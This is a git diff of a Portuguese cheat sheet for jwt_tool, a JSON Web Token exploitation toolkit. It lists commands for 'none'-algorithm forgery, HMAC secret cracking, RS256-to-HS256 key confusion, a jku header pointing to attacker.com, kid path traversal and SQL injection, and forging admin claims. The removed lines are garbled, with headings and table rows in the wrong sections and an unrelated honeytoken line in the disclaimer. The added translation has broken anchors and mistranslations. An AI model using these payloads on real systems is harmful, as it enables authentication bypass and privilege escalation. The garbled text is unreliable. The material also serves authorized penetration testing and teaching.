@@ -1,12 +1,16 @@
-# 🪙 jwt_tool — Guia de referência completo
-
 <!-- language-home-navigation -->
-[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🪙 jwt_tool – Folha de dicas completa
 
+[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
 ```
        ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
        ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
@@ -16,54 +20,52 @@
    ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
         All-in-One JSON Web Token Manipulation & Exploitation Suite
 ```
-
-<p align="center">
+<p alinhar="centro">
   <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
   <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
-  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
+  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Segurança da Web">
   <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
 </p>
 
-<p align="center">
-  <b>🪙 Powerful Python CLI toolkit for analyzing, tampering, forging, scanning, and cracking JSON Web Tokens (JWT)</b>
+<p alinhar="centro">
+  <b>🪙 Kit de ferramentas Python CLI poderoso para analisar, adulterar, falsificar, escanear e quebrar JSON Web Tokens (JWT)</b>
 </p>
 
 ---
 
 ## 📋 Índice
 
-- [Introdução](#-overview--jwt-anatomy)
-- [Instalação](#-installation)
-- [Token Parsing & Inspection](#-token-parsing--inspection)
-- [Automated Vulnerability Scanning (`-M at`)](#-automated-vulnerability-scanning--m-at)
-- [Common Exploitation Scenarios](#-common-exploitation-scenarios)
-  - [Empty signature handling](#algorithm-confusion--none-attack-none)
-  - [HMAC Secret Key Cracking](#hmac-secret-key-cracking)
-  - [Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.](#key-confusion-rs256-to-hs256-with-public-key)
-  - [Header Injection: JKU, X5U & JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
-  - [KID Injection (SQLi & Path Traversal)](#kid-injection-sqli--path-traversal)
-- [Payload Tampering & Forging Claims](#-payload-tampering--forging-claims)
-- [Referência rápida](#-quick-reference-table)
-- [Defensive Considerations & Hardening](#-defensive-considerations--hardening)
-- [Legal Disclaimer](#-legal-disclaimer)
+- [Visão geral e anatomia JWT] (#-visão geral - jwt-anatomy)
+- [Instalação](#-instalação)
+- [Análise e inspeção de token](#-token-parsing--inspection)
+- [Verificação automatizada de vulnerabilidades (`-M at`)](#-automated-vulnerability-scanning--m-at)
+- [Cenários de exploração comuns](#-cenários de exploração comuns)
+  - [Confusão de algoritmo/Nenhum ataque (`none`)](#algoritmo-confusão--none-attack-none)
+  - [Quebra de chave secreta HMAC](#hmac-secret-key-cracking)
+  - [Confusão de chaves: RS256 a HS256 com chave pública](#key-confusion-rs256-to-hs256-with-public-key)
+  - [Injeção de cabeçalho: JKU, X5U e JWK Spoofing](#header-injection-jku-x5u--jwk-spoofing)
+  - [Injeção KID (SQLi e Path Traversal)](#kid-injection-sqli--path-traversal)
+- [Reivindicações de adulteração e falsificação de carga](#-adulteração de carga--reivindicações de falsificação)
+- [Tabela de referência rápida](#-tabela de referência rápida)
+- [Considerações Defensivas e Endurecimento](#-considerações defensivas--endurecimento)
+- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
 
 ---
 
-## 🎯 Introdução
+## 🎯 Visão geral e anatomia JWT
 
-[Legal Disclaimer](#-legal-disclaimer)
+Um JSON Web Token (RFC 7519) consiste em três segmentos codificados em Base64URL separados por pontos (`.`):
 `header.payload.signature`
 
-1. **Header:** Identifies token type (`typ`) and signing algorithm (`alg`, e.g., `HS256`, `RS256`, `none`).
-🎯 Introdução
-3. **Signature:** Cryptographic verification hash preventing client-side tampering.
+1. **Cabeçalho:** Identifica o tipo de token (`typ`) e o algoritmo de assinatura (`alg`, por exemplo, `HS256`, `RS256`, `none`).
+2. **Carga útil:** Contém declarações do usuário (`sub`, `role`, `admin`, `exp`).
+3. **Assinatura:** Hash de verificação criptográfica que evita adulterações do lado do cliente.
 
-Created by **ticarpi**, **jwt_tool** automates testing for architectural and implementation flaws in JWT authentication workflows across APIs and modern web applications.
+Criado por **ticarpi**, **jwt_tool** automatiza testes para falhas de arquitetura e implementação em fluxos de trabalho de autenticação JWT em APIs e aplicativos web modernos.
 
 ---
 
 ## 📥 Instalação
-
 ```bash
 # Clone the repository
 git clone https://github.com/ticarpi/jwt_tool.git
@@ -75,22 +77,19 @@ pip install -r requirements.txt
 # Run jwt_tool
 python3 jwt_tool.py --help
 ```
-
 ---
 
-## 🔍 Token Parsing & Inspection
+## 🔍 Análise e inspeção de token
 
-Decode and inspect header parameters and payload claims:
+Decodifique e inspecione parâmetros de cabeçalho e declarações de carga útil:
 ```bash
 python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
 ```
-
 ---
 
-## ⚡ Automated Vulnerability Scanning (`-M at`)
+## ⚡ Verificação automatizada de vulnerabilidades (`-M at`)
 
-Launch automated playbook scans testing known vulnerabilities against a target web service:
-
+Inicie verificações automatizadas do playbook testando vulnerabilidades conhecidas em um serviço da web de destino:
 ```bash
 # Run All Tests (-M at) sending requests to web endpoint
 python3 jwt_tool.py <JWT_TOKEN> \
@@ -98,48 +97,45 @@ python3 jwt_tool.py <JWT_TOKEN> \
   -u "https://api.target.com/user/profile" \
   -rh "Authorization: Bearer <JWT_TOKEN>"
 ```
-*Tests executed:*
-- ⚡ Automated Vulnerability Scanning (`-M at`)
-- RSA to HMAC key confusion
-- Launch automated playbook scans testing known vulnerabilities against a target web service:
-- Injection into `kid`, `jku`, `x5u` headers
-- Empty signature handling
+*Testes realizados:*
+- Remoção de assinatura (nenhuma variante de algoritmo)
+- Confusão de chave RSA para HMAC
+- Adulteração de reivindicação (`admin=true`, escalonamento de privilégios)
+- Injeção em cabeçalhos `kid`, `jku`, `x5u`
+- Tratamento de assinatura vazia
 
 ---
 
-## 💥 Exemplos práticos
+## 💥 Cenários comuns de exploração
 
-### Empty signature handling
-When backend implementations accept unsigned tokens:
+### Confusão de algoritmo/Nenhum ataque (`none`)
+Quando as implementações de back-end aceitam tokens não assinados:
 ```bash
 # Forge token with 'none' algorithm and stripped signature
 python3 jwt_tool.py <JWT_TOKEN> -X a
 ```
-*Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.
+*Variantes testadas automaticamente:* `none`, `None`, `NONE`, `nOnE`.
 
-### HMAC Secret Key Cracking
-Algorithm Confusion / None Attack (`none`)
+### Quebra de chave secreta HMAC
+Quando HS256/HS384/HS512 usa uma senha fraca:
 ```bash
 # Dictionary attack using rockyou.txt
 python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
 ```
-
-### Variants tested automatically:* `none`, `None`, `NONE`, `nOnE`.
-If the server signs with RSA (RS256) but accepts HMAC (HS256) using its public certificate as the shared HMAC key:
+### Confusão de chaves: RS256 a HS256 com chave pública
+Se o servidor assinar com RSA (RS256), mas aceitar HMAC (HS256) usando seu certificado público como chave HMAC compartilhada:
 ```bash
 # Forge token using server public key file
 python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
 ```
-
-### Header Injection: JKU, X5U & JWK Spoofing
-Injecting attacker-controlled keys or URLs:
+### Injeção de cabeçalho: falsificação de JKU, X5U e JWK
+Injetando chaves ou URLs controlados pelo invasor:
 ```bash
 # Inject attacker-controlled JWKS URL in jku header
 python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
 ```
-
-### KID Injection (SQLi & Path Traversal)
-If the backend uses the `kid` (Key ID) header parameter directly in database queries or file paths:
+### Injeção KID (SQLi e Path Traversal)
+Se o back-end usar o parâmetro de cabeçalho `kid` (Key ID) diretamente em consultas de banco de dados ou caminhos de arquivo:
 ```bash
 # Path traversal pointing to /dev/null (empty secret)
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
@@ -147,13 +143,11 @@ python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""
 # SQL Injection in kid header to bypass signature verification
 python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
 ```
-
 ---
 
-## ✍️ Payload Tampering & Forging Claims
+## ✍️ Reivindicações de adulteração e falsificação de carga útil
 
-Modify specific claim values and resign the token:
-
+Modifique valores de declaração específicos e renuncie ao token:
 ```bash
 # Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
 python3 jwt_tool.py <JWT_TOKEN> \
@@ -162,32 +156,31 @@ python3 jwt_tool.py <JWT_TOKEN> \
   -pc "role" -pv "SuperAdmin" \
   -k "secret_key"
 ```
-
 ---
 
-## ⚡ Referência rápida
+## ⚡ Tabela de referência rápida
 
-|Objective|Comando|
+| Objetivo | Comando |
 |-----------|---------|
-|**Decode & Parse Token**|`python3 jwt_tool.py <JWT>`|
-|**All-in-One Playbook Scan**|`python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"`|
-|**Crack HMAC Secret**|`python3 jwt_tool.py <JWT> -C -d rockyou.txt`|
-|**Bypass with None Algorithm**|`python3 jwt_tool.py <JWT> -X a`|
-|**RS256 -> HS256 Confusion**|`python3 jwt_tool.py <JWT> -X k -pk public.pem`|
-|**Tamper Payload & Sign**|`python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>`|
-|**KID Path Traversal**|`python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""`|
+| **Decodificar e analisar token** | `python3 jwt_tool.py <JWT>` |
+| **Digitalização completa do manual** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
+| **Decifrar o segredo do HMAC** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
+| **Algoritmo Ignorar sem Nenhum** | `python3 jwt_tool.py <JWT> -X a` |
+| **RS256 -> Confusão HS256** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
+| **Tamper carga útil e sinal** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
+| **Travessia do caminho KID** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |
 
 ---
 
-## 🛡️ Defensive Considerations & Hardening
+## 🛡️ Considerações defensivas e endurecimento
 
-|**KID Path Traversal**|`python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""`|
-2. **Reject Client-Controlled Keys:** Do not blindly trust `jku`, `jwk`, or `x5u` headers from untrusted input without strict domain allowlists.
-3. **Use Strong Secrets:** Ensure HMAC keys are at least 256 bits of high-entropy cryptographic random bytes.
+1. **Lista de permissões de algoritmo estrita:** Nunca aceite `none` ou troca de algoritmo. Verifique explicitamente os algoritmos esperados (somente `RS256`).
+2. **Rejeite chaves controladas pelo cliente:** Não confie cegamente nos cabeçalhos `jku`, `jwk` ou `x5u` de entradas não confiáveis ​​sem listas de permissões de domínio estritas.
+3. **Use segredos fortes:** Certifique-se de que as chaves HMAC tenham pelo menos 256 bits de bytes aleatórios criptográficos de alta entropia.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Isenção de responsabilidade legal
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> jwt_tool is designed strictly for authorized penetration testing, API vulnerability assessments, and educational research. Forging tokens to access unauthorized systems without written permission is strictly illegal.
+> [!CUIDADO]
+> jwt_tool foi projetado estritamente para testes de penetração autorizados, avaliações de vulnerabilidade de API e pesquisas educacionais. Forjar tokens para acessar sistemas não autorizados sem permissão por escrito é estritamente ilegal.
